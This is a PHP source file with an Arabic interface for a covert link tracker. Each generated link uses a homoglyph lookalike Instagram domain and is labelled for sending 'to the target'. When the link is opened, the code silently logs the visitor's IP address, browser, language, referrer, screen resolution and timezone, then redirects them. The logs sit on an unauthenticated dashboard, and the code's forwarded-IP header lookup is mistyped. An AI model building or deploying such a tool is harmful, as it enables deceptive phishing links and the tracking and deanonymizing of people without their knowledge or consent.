<?php
$db = new PDO('sqlite:tracker.db');$db->exec("CREATE TABLE IF NOT EXISTS links (
    id INTEGER PRIMARY KEY AUTOINCREMENT, 
    code TEXT UNIQUE, 
    target_url TEXT, 
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$db->exec("CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT, 
    code TEXT, 
    ip TEXT, 
    user_agent TEXT, 
    language TEXT, 
    referrer TEXT, 
    screen_res TEXT, 
    timezone TEXT, 
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

// دالة لجلب عنوان الـ IP الحقيقي للمستخدم حتى خلف خوادم Render الوسيطة
function get_real_ip() {
    if (!empty($_SERVER['HTTP_X-FORWARDED-FOR'])) {
        $ips = explode(',',$_SERVER['HTTP_X-FORWARDED-FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

// 1. معالجة إعادة التوجيه عند فتح الرابط المختصر
if (isset($_GET['r'])) {
    $code =$_GET['r'];

    $stmt =$db->prepare("SELECT target_url FROM links WHERE code = ?");
    $stmt->execute([$code]);
    $link =$stmt->fetch(PDO::FETCH_ASSOC);

    if ($link) {$target = $link['target_url'];$ip = get_real_ip();
        $ua =$_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $lang =$_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown';
        $ref =$_SERVER['HTTP_REFERER'] ?? 'Direct Access';

        $screen =$_GET['screen'] ?? 'N/A';
        $tz =$_GET['tz'] ?? 'N/A';

        $logStmt =$db->prepare("INSERT INTO logs (code, ip, user_agent, language, referrer, screen_res, timezone) VALUES (?, ?, ?, ?, ?, ?, ?)");
        $logStmt->execute([$code, $ip,$ua, $lang,$ref, $screen,$tz]);

        header("Location: " . $target);
        exit();
    } else {
        die("الرابط غير موجود.");
    }
}

// 2. إنشاء رابط تتبع جديد
$generated_link = "";
$tracking_code = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
    $target_url = trim($_POST['target_url']);
    if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
        $target_url = "https://" . $target_url;
    }

    $code = substr(md5(uniqid(rand(), true)), 0, 7);
    $stmt =$db->prepare("INSERT INTO links (code, target_url) VALUES (?, ?)");
    $stmt->execute([$code,$target_url]);

    $tracking_code =$code;
    $generated_link = "https://www.instаgrаm.com.com/?r=" . $code;
}

// 3. تصفية وعرض السجلات
$filter_code = trim($_GET['track'] ?? '');
if (!empty($filter_code)) {
    $stmt =$db->prepare("SELECT * FROM logs WHERE code = ? ORDER BY id DESC");
    $stmt->execute([$filter_code]);
    $logs =$stmt->fetchAll(PDO::FETCH_ASSOC);
} else {
    $logs =$db->query("SELECT * FROM logs ORDER BY id DESC LIMIT 50")->fetchAll(PDO::FETCH_ASSOC);
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hello World from azez</title>
    <style>
        body { font-family: Arial, sans-serif; background: #1a1a24; color: #e1e1e6; margin: 0; padding: 20px; direction: rtl; }
        .container { max-width: 900px; margin: 0 auto; }
        .card { background: #242432; padding: 25px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); margin-bottom: 20px; }
        h1, h2 { color: #4da6ff; margin-top: 0; }
        input[type="text"] { width: 75%; padding: 12px; border: 1px solid #3b3b4f; border-radius: 6px; background: #12121a; color: #fff; font-size: 15px; }
        button, input[type="submit"] { background: #0088cc; color: white; border: none; padding: 12px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 15px; }
        button:hover, input[type="submit"]:hover { background: #006699; }
        .result-box { background: #12121a; border-right: 4px solid #0088cc; padding: 15px; margin-top: 15px; border-radius: 4px; word-break: break-all; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 13px; }
        th, td { border: 1px solid #33334d; padding: 10px; text-align: center; }
        th { background: #0088cc; color: white; }
        tr:nth-child(even) { background: #1d1d29; }
        .badge { background: #28a745; color: white; padding: 3px 7px; border-radius: 4px; font-size: 11px; }
    </style>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const redirectCode = urlParams.get('r');
        const hasScreen = urlParams.has('screen');

        if (redirectCode && !hasScreen) {
            const screenRes = screen.width + "x" + screen.height;
            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
            window.location.href = `/?r=${redirectCode}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
        }
    </script>
</head>
<body>
    <div class="container">
        <h1>Hello World from azez</h1>

        <!-- إنشاء رابط -->
        <div class="card">
            <h2>إنشاء رابط تتبع جديد</h2>
            <form method="POST">
                <input type="text" name="target_url" placeholder="أدخل الرابط الأصلي (مثل youtube.com)" required>
                <input type="submit" name="create" value="إنشاء الرابط">
            </form>

            <?php if (!empty($generated_link)): ?>
                <div class="result-box">
                    <p><strong>رابط التتبع (إرساله للهدف):</strong><br>
                    <a href="<?php echo $generated_link; ?>" target="_blank" style="color: #4da6ff;"><?php echo $generated_link; ?></a></p>
                    <p><strong>كود التتبع الخاص بك:</strong> <span class="badge"><?php echo $tracking_code; ?></span></p>
                    <p><a href="/?track=<?php echo $tracking_code; ?>" style="color: #28a745;">عرض السجلات الخاصة بهذا الكود فقط</a></p>
                </div>
            <?php endif; ?>
        </div>

        <!-- قسم البحث والتتبع حسب الكود -->
        <div class="card">
            <h2>البحث في السجلات (تتبع حسب الكود)</h2>
            <form method="GET" style="margin-bottom: 15px;">
                <input type="text" name="track" placeholder="ضع كود التتبع هنا (مثال: c45811a)..." value="<?php echo htmlspecialchars($filter_code); ?>" style="width: 65%;">
                <button type="submit">بحث</button>
                <a href="/" style="color: #aaa; margin-right: 10px; font-size: 13px;">عرض الكل</a>
            </form>

            <h3>سجلات الزيارات (<?php echo empty($filter_code) ? "الكل" : "للكود: " . htmlspecialchars($filter_code); ?>)</h3>
            <div style="overflow-x: auto;">
                <table>
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>الكود</th>
                            <th>عوان IP الحقيقي</th>
                            <th>المنطقة الزمنية</th>
                            <th>الشاشة</th>
                            <th>المتصفح / النظام</th>
                            <th>المحيل</th>
                            <th>الوقت</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if (empty($logs)): ?>
                            <tr><td colspan="8">لا توجد زيارات مسجلة تطابق هذا البحث حتى الآن.</td></tr>
                        <?php else: ?>
                            <?php foreach ($logs as$log): ?>
                            <tr>
                                <td><?php echo $log['id']; ?></td>
                                <td><span class="badge"><?php echo htmlspecialchars($log['code']); ?></span></td>
                                <td><strong><?php echo htmlspecialchars($log['ip']); ?></strong></td>
                                <td><?php echo htmlspecialchars($log['timezone']); ?></td>
                                <td><?php echo htmlspecialchars($log['screen_res']); ?></td>
                                <td style="max-width: 180px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="<?php echo htmlspecialchars($log['user_agent']); ?>">
                                    <?php echo htmlspecialchars($log['user_agent']); ?>
                                </td>
                                <td><?php echo htmlspecialchars($log['referrer']); ?></td>
                                <td><?php echo htmlspecialchars($log['created_at']); ?></td>
                            </tr>
                            <?php endforeach; ?>
                        <?php endif; ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</body>
</html>
